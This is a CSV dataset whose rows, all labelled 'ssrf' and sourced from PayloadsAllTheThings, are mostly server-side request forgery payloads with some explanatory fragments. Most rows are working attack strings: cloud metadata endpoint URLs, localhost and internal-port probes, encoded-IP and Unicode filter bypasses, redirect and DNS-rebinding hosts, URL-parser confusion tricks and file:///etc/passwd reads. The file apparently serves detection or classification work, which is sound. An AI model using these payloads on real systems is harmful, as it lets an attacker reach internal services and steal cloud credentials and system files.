payload,label,source
- Python based scanner to find potential SSRF parameters,ssrf,payloads_all_the_things
"- A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.",ssrf,payloads_all_the_things
"Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server",ssrf,payloads_all_the_things
"url = input(""Enter URL:"")",ssrf,payloads_all_the_things
response = requests.get(url),ssrf,payloads_all_the_things
return response,ssrf,payloads_all_the_things
http://169.254.169.254/latest/meta-data/,ssrf,payloads_all_the_things
localhost,ssrf,payloads_all_the_things
Using `localhost`,ssrf,payloads_all_the_things
http://localhost:80,ssrf,payloads_all_the_things
http://localhost:22,ssrf,payloads_all_the_things
https://localhost:443,ssrf,payloads_all_the_things
127.0.0.1,ssrf,payloads_all_the_things
Using `127.0.0.1`,ssrf,payloads_all_the_things
http://127.0.0.1:80,ssrf,payloads_all_the_things
http://127.0.0.1:22,ssrf,payloads_all_the_things
https://127.0.0.1:443,ssrf,payloads_all_the_things
Using `0.0.0.0`,ssrf,payloads_all_the_things
http://0.0.0.0:80,ssrf,payloads_all_the_things
http://0.0.0.0:22,ssrf,payloads_all_the_things
https://0.0.0.0:443,ssrf,payloads_all_the_things
[::],ssrf,payloads_all_the_things
Using unspecified address in IPv6 `[::]`,ssrf,payloads_all_the_things
http://[::]:80/,ssrf,payloads_all_the_things
[0000::1],ssrf,payloads_all_the_things
Using IPv6 loopback addres`[0000::1]`,ssrf,payloads_all_the_things
http://[0000::1]:80/,ssrf,payloads_all_the_things
http://[0:0:0:0:0:ffff:127.0.0.1],ssrf,payloads_all_the_things
http://[::ffff:127.0.0.1],ssrf,payloads_all_the_things
"NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",ssrf,payloads_all_the_things
127.0.0.0/8,ssrf,payloads_all_the_things
http://127.127.127.127,ssrf,payloads_all_the_things
http://127.0.1.3,ssrf,payloads_all_the_things
http://127.0.0.0,ssrf,payloads_all_the_things
http://0/,ssrf,payloads_all_the_things
http://127.1,ssrf,payloads_all_the_things
http://127.0.1,ssrf,payloads_all_the_things
http://2130706433/ = http://127.0.0.1,ssrf,payloads_all_the_things
http://3232235521/ = http://192.168.0.1,ssrf,payloads_all_the_things
http://3232235777/ = http://192.168.1.1,ssrf,payloads_all_the_things
http://2852039166/ = http://169.254.169.254,ssrf,payloads_all_the_things
http://0177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
http://o177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
http://0o177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
http://q177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
http://0x7f000001 = http://127.0.0.1,ssrf,payloads_all_the_things
http://0xc0a80101 = http://192.168.1.1,ssrf,payloads_all_the_things
http://0xa9fea9fe = http://169.254.169.254,ssrf,payloads_all_the_things
http://127.0.0.1/%61dmin,ssrf,payloads_all_the_things
http://127.0.0.1/%2561dmin,ssrf,payloads_all_the_things
Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`,ssrf,payloads_all_the_things
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com,ssrf,payloads_all_the_things
\d,ssrf,payloads_all_the_things
"Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.",ssrf,payloads_all_the_things
::1   localhost ip6-localhost ip6-loopback,ssrf,payloads_all_the_things
in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6,ssrf,payloads_all_the_things
http://ip6-localhost = ::1,ssrf,payloads_all_the_things
http://ip6-loopback = ::1,ssrf,payloads_all_the_things
vulnerable.com/index.php?url=http://redirect-server,ssrf,payloads_all_the_things
http://localhost,ssrf,payloads_all_the_things
Redirects to `http://localhost` with `307 Temporary Redirect` status code,ssrf,payloads_all_the_things
https://307.r3dir.me/--to/?url=http://localhost,ssrf,payloads_all_the_things
Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code,ssrf,payloads_all_the_things
https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me,ssrf,payloads_all_the_things
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
Address: 1.2.3.4,ssrf,payloads_all_the_things
Address: 169.254.169.254,ssrf,payloads_all_the_things
http://127.1.1.1:80\@127.2.2.2:80/,ssrf,payloads_all_the_things
http://127.1.1.1:80\@@127.2.2.2:80/,ssrf,payloads_all_the_things
http://127.1.1.1:80:\@@127.2.2.2:80/,ssrf,payloads_all_the_things
http://127.1.1.1:80#\@127.2.2.2:80/,ssrf,payloads_all_the_things
http:127.0.0.1/,ssrf,payloads_all_the_things
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/,ssrf,payloads_all_the_things
`urllib2` treats `1.1.1.1` as the destination,ssrf,payloads_all_the_things
`requests` and browsers redirect to `2.2.2.2`,ssrf,payloads_all_the_things
`urllib` resolves to `3.3.3.3`,ssrf,payloads_all_the_things
http://127.0.0.1/,ssrf,payloads_all_the_things
Some parsers replace `http:127.0.0.1/` to `http://127.0.0.1/`,ssrf,payloads_all_the_things
filter_var(),ssrf,payloads_all_the_things
http://test???test.com,ssrf,payloads_all_the_things
`http://test???test.com`,ssrf,payloads_all_the_things
0://evil.com:80;http://google.com:80/,ssrf,payloads_all_the_things
`0://evil.com:80;http://google.com:80/`,ssrf,payloads_all_the_things
"echo var_dump(filter_var(""http://test???test.com"", FILTER_VALIDATE_URL));",ssrf,payloads_all_the_things
"echo var_dump(filter_var(""0://evil.com;google.com"", FILTER_VALIDATE_URL));",ssrf,payloads_all_the_things
jar:scheme://domain/path!/,ssrf,payloads_all_the_things
jar:http://127.0.0.1!/,ssrf,payloads_all_the_things
jar:https://127.0.0.1!/,ssrf,payloads_all_the_things
jar:ftp://127.0.0.1!/,ssrf,payloads_all_the_things
file:///etc/passwd,ssrf,payloads_all_the_things
file://\/\/etc/passwd,ssrf,payloads_all_the_things
ssrf.php?url=http://127.0.0.1:22,ssrf,payloads_all_the_things
ssrf.php?url=http://127.0.0.1:80,ssrf,payloads_all_the_things
ssrf.php?url=http://127.0.0.1:443,ssrf,payloads_all_the_things
